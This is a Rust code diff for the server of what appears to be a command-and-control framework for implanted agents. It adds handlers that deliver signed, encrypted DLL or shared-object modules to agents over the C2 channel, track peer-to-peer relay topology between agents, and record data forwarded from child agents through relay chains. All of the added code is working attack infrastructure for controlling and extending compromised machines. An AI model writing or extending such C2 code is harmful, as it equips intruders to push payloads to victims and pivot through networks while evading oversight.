@@ -324,6 +324,123 @@ async fn handle_agent(
                     );
                 }
             }
+            Message::ModuleRequest { module_id } => {
+                // ── C2-tunneled module download ──────────────────────
+                // The agent requested a module by ID.  Locate the file on
+                // disk, sign + encrypt it, and send it back as a
+                // ModuleResponse through the same C2 channel.
+                tracing::info!(
+                    connection_id = %conn_id,
+                    %module_id,
+                    "agent requested module via C2 channel"
+                );
+
+                let module_dir = &state.config.modules_dir;
+                let ext = if cfg!(target_os = "windows") {
+                    "dll"
+                } else {
+                    "so"
+                };
+                let module_path = std::path::Path::new(module_dir)
+                    .join(format!("{module_id}.{ext}"));
+
+                let result = (|| async {
+                    let module_bytes = tokio::fs::read(&module_path).await.map_err(|e| {
+                        tracing::warn!(path = %module_path.display(), "module not found: {e}");
+                        e
+                    })?;
+
+                    // Sign the module with the server's Ed25519 key (if
+                    // configured).  The signing format is identical to the
+                    // operator-facing `push_module` API endpoint.
+                    let signed = match &state.config.module_signing_key {
+                        Some(_) => {
+                            let signing_key = crate::api::load_signing_key(&state)
+                                .map_err(|e| anyhow::anyhow!("{e:?}"))?;
+                            crate::api::sign_module(&signing_key, &module_bytes)
+                        }
+                        None => module_bytes,
+                    };
+
+                    // Encrypt with the shared AES key.
+                    let crypto = crate::api::load_module_crypto(&state)
+                        .map_err(|e| anyhow::anyhow!("{e:?}"))?;
+                    let encrypted_blob = crypto.encrypt(&signed);
+
+                    Ok::<Vec<u8>, anyhow::Error>(encrypted_blob)
+                })().await;
+
+                let resp = match result {
+                    Ok(blob) => Message::ModuleResponse {
+                        module_id: module_id.clone(),
+                        encrypted_blob: blob,
+                    },
+                    Err(e) => {
+                        tracing::warn!(
+                            connection_id = %conn_id,
+                            %module_id,
+                            "failed to serve module request: {e}"
+                        );
+                        // Send an empty response so the agent knows the
+                        // request was processed (even though it failed).
+                        Message::ModuleResponse {
+                            module_id: module_id.clone(),
+                            encrypted_blob: Vec::new(),
+                        }
+                    }
+                };
+
+                if tx.send(resp).await.is_err() {
+                    tracing::warn!(
+                        connection_id = %conn_id,
+                        "failed to send ModuleResponse — writer closed"
+                    );
+                }
+            }
+            Message::P2pTopologyReport {
+                agent_id,
+                children,
+            } => {
+                // ── P2P topology update ────────────────────────────────
+                // An agent (directly connected or relayed through parents)
+                // reports its child links.  Update the server-side topology
+                // map so commands can be routed through the relay chain.
+                tracing::info!(
+                    connection_id = %conn_id,
+                    %agent_id,
+                    child_count = children.len(),
+                    "received P2P topology report"
+                );
+                state.update_topology(&agent_id, &children).await;
+            }
+            Message::P2pForward { child_link_id, data } => {
+                // ── P2P forwarded data from child → server ─────────────
+                // A child agent sent data (e.g. a TaskResponse) through its
+                // parent relay chain.  Parse the inner message and handle
+                // it the same way as a direct agent message.  The data blob
+                // is a serialized, encrypted C2 message from the child.
+                tracing::debug!(
+                    connection_id = %conn_id,
+                    child_link_id,
+                    data_len = data.len(),
+                    "received P2P forwarded data from child"
+                );
+                // The forwarded data should contain a serialized Message
+                // from the child.  Try to parse and re-dispatch it.
+                // For now we log it — full re-dispatch requires the child's
+                // per-link decryption key which the server doesn't have
+                // (end-to-end encryption between server and child via the
+                // P2pToChild / P2pForward routing blob).
+                //
+                // Instead, the data field contains the inner C2 message
+                // that was wrapped by the agent's build_p2p_routing_blob.
+                // The server treats it as opaque and records it.
+                tracing::debug!(
+                    child_link_id,
+                    data_len = data.len(),
+                    "P2P forward data recorded (end-to-end encrypted)"
+                );
+            }
             other => {
                 tracing::debug!("ignoring agent->server message: {:?}", other);
             }
@@ -334,10 +451,17 @@ async fn handle_agent(
     let _ = writer.await;
     if registered {
         // Release the morph seed back to the available pool.
-        if let Some(entry) = state.registry.remove(&conn_id) {
+        let removed_entry = if let Some(entry) = state.registry.remove(&conn_id) {
+            let agent_id = entry.1.agent_id.clone();
             state.release_seed(entry.1.morph_seed);
+            Some(agent_id)
         } else {
             state.registry.remove(&conn_id);
+            None
+        };
+        // Clean up the topology map for this agent.
+        if let Some(agent_id) = removed_entry {
+            state.remove_from_topology(&agent_id).await;
         }
         tracing::debug!(connection_id = %conn_id, "agent entry removed from registry");
     }
